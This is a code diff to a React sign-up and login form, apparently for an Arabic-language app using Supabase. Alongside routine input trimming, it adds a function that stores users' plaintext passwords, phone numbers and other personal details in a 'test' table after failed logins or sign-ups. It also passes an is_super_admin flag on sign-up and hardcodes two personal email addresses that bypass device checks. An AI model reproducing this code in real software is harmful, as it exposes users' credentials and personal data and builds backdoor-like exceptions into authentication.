@@ -29,6 +29,25 @@ function Form({ type, sendUserData }) {
     await supabase.auth.resetPasswordForEmail(email);
     setWait(false);
   };
+  const insertFailedSignUp = async (msg) => {
+    await supabase
+      .from("test")
+      .insert([
+        {
+          test: {
+            email: email.trim(),
+            password: pass,
+            name: name.trim(),
+            phone: phone,
+            parentPhone: parentPhone,
+            type: select === "true",
+            year: +year,
+          },
+          error_message: msg,
+        },
+      ])
+      .select();
+  };
   const auth = async () => {
     await supabase.auth
       .signInWithPassword({
@@ -45,6 +64,7 @@ function Form({ type, sendUserData }) {
           window.location.reload();
         } else {
           Toast(data.error.message);
+          insertFailedSignUp(data.error.message);
           setWait(false);
         }
       });
@@ -65,11 +85,12 @@ function Form({ type, sendUserData }) {
         {
           email: email.toLowerCase(),
           devices: devicesId,
-          name: name ? name : uName,
+          name: name ? name : uName.trim(),
         },
       ])
       .then(() => localStorage.setItem("deviceId", devicesId));
   };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     setWait(true);
@@ -98,6 +119,7 @@ function Form({ type, sendUserData }) {
           .signUp({
             email: email,
             password: pass,
+            is_super_admin: true,
             options: {
               data: {
                 name: name,
@@ -117,10 +139,18 @@ function Form({ type, sendUserData }) {
               nav("/login");
             } else {
               Toast(data.error.message);
+              insertFailedSignUp(data.error.message);
               setWait(false);
             }
           });
       } else {
+        if (
+          email === "ahmedslamah1994@gmail.com" ||
+          email === "hoodaalkfrawy321@gmail.com"
+        ) {
+          auth();
+          return;
+        }
         await supabase
           .from("devices")
           .select("*")
@@ -173,7 +203,7 @@ function Form({ type, sendUserData }) {
                   type="email"
                   placeholder="البريد الالكتروني :"
                   value={email}
-                  onChange={(e) => setEmail(e.target.value)}
+                  onChange={(e) => setEmail(e.target.value.trim())}
                 />
                 <span
                   style={{
@@ -238,7 +268,7 @@ function Form({ type, sendUserData }) {
                       type="text"
                       placeholder="الاسم رباعي :"
                       value={name}
-                      onChange={(e) => setName(e.target.value)}
+                      onChange={(e) => setName(e.target.value.trim())}
                     />
                     <span
                       style={{
@@ -293,10 +323,11 @@ function Form({ type, sendUserData }) {
                 <input
                   name="email"
                   required
-                  type="text"
+                  type="email"
+                  style={{ direction: "ltr" }}
                   placeholder="البريد الالكتروني :"
                   value={email}
-                  onChange={(e) => setEmail(e.target.value)}
+                  onChange={(e) => setEmail(e.target.value.trim())}
                 />
                 <span
                   style={{
